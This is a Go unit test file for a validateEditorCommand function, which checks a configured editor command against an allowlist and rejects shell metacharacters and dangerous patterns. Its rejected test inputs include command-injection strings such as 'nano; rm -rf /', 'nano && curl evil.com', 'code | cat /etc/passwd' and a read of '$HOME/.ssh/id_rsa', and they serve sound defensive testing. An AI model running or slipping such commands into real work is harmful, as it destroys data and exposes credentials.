package cmd

import (
	"testing"
)

func TestValidateEditorCommand(t *testing.T) {
	tests := []struct {
		name        string
		editor      string
		expectError bool
		errorMsg    string
	}{
		// Safe editors from allowlist
		{
			name:     "safe editor - nano",
			editor:   "nano",
			expectError: false,
		},
		{
			name:     "safe editor - code",
			editor:   "code",
			expectError: false,
		},
		{
			name:     "safe editor - vim",
			editor:   "vim",
			expectError: false,
		},
		{
			name:     "safe editor - notepad",
			editor:   "notepad",
			expectError: false,
		},
		{
			name:     "safe editor - macOS TextEdit",
			editor:   "open -a TextEdit",
			expectError: false,
		},

		// Empty or whitespace
		{
			name:        "empty editor",
			editor:      "",
			expectError: true,
			errorMsg:    "cannot be empty",
		},
		{
			name:        "whitespace only",
			editor:      "   ",
			expectError: true,
			errorMsg:    "cannot be empty",
		},

		// Dangerous characters
		{
			name:        "command injection with semicolon",
			editor:      "nano; rm -rf /",
			expectError: true,
			errorMsg:    "dangerous character: ';'",
		},
		{
			name:        "command injection with pipe",
			editor:      "code | cat /etc/passwd",
			expectError: true,
			errorMsg:    "dangerous character: '|'",
		},
		{
			name:        "command injection with ampersand",
			editor:      "nano && curl evil.com",
			expectError: true,
			errorMsg:    "dangerous character: '&'",
		},
		{
			name:        "command injection with backtick",
			editor:      "vim `whoami`",
			expectError: true,
			errorMsg:    "dangerous character: '`'",
		},
		{
			name:        "command injection with dollar expansion",
			editor:      "nano $HOME/.ssh/id_rsa",
			expectError: true,
			errorMsg:    "dangerous character: '$'",
		},

		// Dangerous patterns
		{
			name:        "path traversal with ..",
			editor:      "nano ../../../etc/passwd",
			expectError: true,
			errorMsg:    "dangerous pattern: \"..\"",
		},
		{
			name:        "file removal command",
			editor:      "rm -rf /tmp",
			expectError: true,
			errorMsg:    "dangerous pattern: \"rm \"",
		},
		{
			name:        "format command",
			editor:      "format c:",
			expectError: true,
			errorMsg:    "dangerous pattern: \"format \"",
		},
		{
			name:        "shell redirection",
			editor:      "nano > /tmp/output",
			expectError: true,
			errorMsg:    "dangerous character: '>'",
		},

		// Edge cases
		{
			name:        "complex but safe macOS command",
			editor:      "open -a Sublime Text",
			expectError: false,
		},
		{
			name:        "unsafe macOS command",
			editor:      "open -a \"rm -rf /\"",
			expectError: true,
			errorMsg:    "dangerous pattern: \"rm \"",
		},

		// Unknown but safe commands (should pass with warning)
		{
			name:     "unknown but safe editor",
			editor:   "gedit",
			expectError: false, // Passes with warning but no error
		},
		{
			name:     "unknown but safe editor 2",
			editor:   "atom",
			expectError: false, // Passes with warning but no error
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			result, err := validateEditorCommand(tt.editor)

			if tt.expectError {
				if err == nil {
					t.Errorf("validateEditorCommand(%q) expected error containing %q, got nil", tt.editor, tt.errorMsg)
				} else if !containsString(err.Error(), tt.errorMsg) {
					t.Errorf("validateEditorCommand(%q) error = %q, expected to contain %q", tt.editor, err.Error(), tt.errorMsg)
				}
			} else {
				if err != nil {
					t.Errorf("validateEditorCommand(%q) unexpected error: %v", tt.editor, err)
				}
				if result != tt.editor {
					t.Errorf("validateEditorCommand(%q) = %q, expected %q", tt.editor, result, tt.editor)
				}
			}
		})
	}
}

// Helper function to check if a string contains a substring
func containsString(s, substr string) bool {
	return len(s) >= len(substr) && (s == substr || len(s) > len(substr) &&
		(s[:len(substr)] == substr || s[len(s)-len(substr):] == substr ||
		 indexOfSubstring(s, substr) >= 0))
}

func indexOfSubstring(s, substr string) int {
	for i := 0; i <= len(s)-len(substr); i++ {
		if s[i:i+len(substr)] == substr {
			return i
		}
	}
	return -1
}